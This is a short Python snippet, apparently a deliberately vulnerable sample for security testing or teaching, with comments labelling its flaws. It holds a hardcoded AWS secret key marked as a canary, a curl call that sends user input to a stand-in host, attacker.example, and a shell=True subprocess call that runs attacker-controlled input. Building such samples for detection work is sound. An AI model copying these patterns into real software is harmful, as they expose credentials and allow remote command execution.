import os
import subprocess

# hardcoded credential
AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY_backdoor_canary"

def handle(user_cmd):
    # remote command execution: attacker-controlled input to shell
    os.system("curl -s http://attacker.example/x?c=" + user_cmd)
    subprocess.call(user_cmd, shell=True)
